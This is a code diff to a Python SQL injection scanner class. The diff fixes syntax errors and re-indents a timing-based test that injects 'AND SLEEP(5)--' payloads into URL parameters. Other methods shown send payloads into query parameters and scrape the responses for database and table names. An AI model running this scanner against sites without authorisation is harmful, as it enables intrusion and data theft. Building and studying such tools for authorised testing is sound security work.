@@ -126,13 +126,15 @@ class SQLScanner:
                                     print("[i] Exiting...")
                                     exit(1)
                                 else: 
-                                    //self.db_info(db,)
+                                    ## self.db_info(db,)
+                                    print("")
                             except KeyboardInterrupt as ke : 
                                 print(f"[i] {ke}")
                             except Exception as e:
                                 print(f"[-] Error : {e}")
+                            
                             return True
-                            exit(1)
+                            
 
                 except requests.RequestException as e:
                     print(f"[-] Error making request: {e}")
@@ -178,7 +180,7 @@ class SQLScanner:
                         continue
                     for db,errors in self.sql_errors.items(): 
                         if any(error in response.text for error in errors):
-                            print(f"[!] SQL Injection Vulnerability Found!"i)
+                            print(f"[!] SQL Injection Vulnerability Found!")
                             print(f"    Form URL: {form_url}")
                             print(f"    Payload: {payload}")
                             print(f"[i] Database: {db}")
@@ -188,38 +190,38 @@ class SQLScanner:
         return False
 
     def test_timing_based_injection(self, payloads, baseline_requests=3, threshold_multiplier=3):
-    
-    	try:
-        	baseline_times = []
-        	for _ in range(baseline_requests):
-            		response = requests.get(self.url, headers=self.headers, timeout=10)
-            		baseline_times.append(response.elapsed.total_seconds())
-
-        	baseline_avg = mean(baseline_times)
-        	threshold_time = baseline_avg * threshold_multiplier
-        	print(f"[i] Baseline response time: {baseline_avg:.2f}s, Threshold: {threshold_time:.2f}s")
-
-        	for payload in payloads:
-            		timing_payload = payload.replace("'", " AND SLEEP(5)-- ")  
-            		encoded_payload = quote(timing_payload)
-            		full_url = f"{self.url}?{encoded_payload}"
-
-            		try:
-                		response = requests.get(full_url, headers=self.headers, timeout=10)
-                		elapsed_time = response.elapsed.total_seconds()
-
-                		if elapsed_time > threshold_time:
-                    			print(f"[!] Timing-Based SQL Injection Vulnerability Found!")
-                    			print(f"    URL: {full_url}")
-                    			print(f"    Response Time: {elapsed_time:.2f}s")
-                    			return True
-            		except requests.RequestException as e:
-                		print(f"[-] Error during request to {full_url}: {e}")
-
-        	print("[INFO] No timing-based SQL injection vulnerabilities detected.")
-    	except requests.RequestException as e:
-        	print(f"[-] Error testing timing-based injection: {e}")
-    	return False
+        try:
+            baseline_times = []
+            for _ in range(baseline_requests):
+                response = requests.get(self.url, headers=self.headers, timeout=10)
+                baseline_times.append(response.elapsed.total_seconds())
+                
+            baseline_avg = mean(baseline_times)
+            threshold_time = baseline_avg * threshold_multiplier
+            print(f"[i] Baseline response time: {baseline_avg:.2f}s, Threshold: {threshold_time:.2f}s")
+                
+            for payload in payloads:
+                timing_payload = payload.replace("'", " AND SLEEP(5)-- ")  
+                encoded_payload = quote(timing_payload)
+                full_url = f"{self.url}?{encoded_payload}"
+                    
+                try:
+                    response = requests.get(full_url, headers=self.headers, timeout=10)
+                    elapsed_time = response.elapsed.total_seconds()
+                        
+                    if elapsed_time > threshold_time:
+                        print(f"[!] Timing-Based SQL Injection Vulnerability Found!")
+                        print(f"    URL: {full_url}")
+                        print(f"    Response Time: {elapsed_time:.2f}s")
+                        return True
+                except requests.RequestException as e:
+                    print(f"[-] Error during request to {full_url}: {e}")
+                
+            print("[INFO] No timing-based SQL injection vulnerabilities detected.")
+        except requests.RequestException as e:
+            print(f"[-] Error testing timing-based injection: {e}")
+            
+        return False
 
     def test_union_based_injection(self,payloads):
         parsed_url = urlparse(self.url)
@@ -285,8 +287,8 @@ class SQLScanner:
                 modified_params[param] = payload
                 modified_query = urlencode(modified_params,doseq=True)
                 full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
-                response = request.get(full_url,header=self.headers)
-                baseline_response = request.get(f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_params}",header=self.headers)
+                response = requests.get(full_url,header=self.headers)
+                baseline_response = requests.get(f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_params}",header=self.headers)
                 baseline_text = BeautifulSoup(baseline_response.text,"html.parser").get_text()
                 clean_text = BeautifulSoup(response.text,"html.parser").get_text()
                 if response.status_code in [400, 403, 404, 502, 503, 505]:
@@ -297,7 +299,7 @@ class SQLScanner:
                         filtered_matches = [match for match in matches if len(match)<30 and not any(char in match for char in "<>/=\"")]
                         print(f"[+] Potential matches: {filtered_matches}\n")
 
-    def tables_infor(db,payloads):
+    def tables_infor(self,db,payloads):
         parsed_url = urlparse(self.url)
         query_params = parse_qs(parsed_url.query)
         for param in query_params: 
@@ -306,8 +308,8 @@ class SQLScanner:
                 modified_params[param] = payload
                 modified_query = urlencode(modified_params,doseq=True)
                 full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"
-                response = request.get(full_url,header=self.headers)
-                baseline_response = request.get(f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_params}",header=self.headers)
+                response = requests.get(full_url,header=self.headers)
+                baseline_response = requests.get(f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_params}",header=self.headers)
                 baseline_text = BeautifulSoup(baseline_response.text,"html.parser").get_text()
                 clean_text = BeautifulSoup(response.text,"html.parser").get_text()
                 if response.status_code in [400,403,404,502,503,505]: 
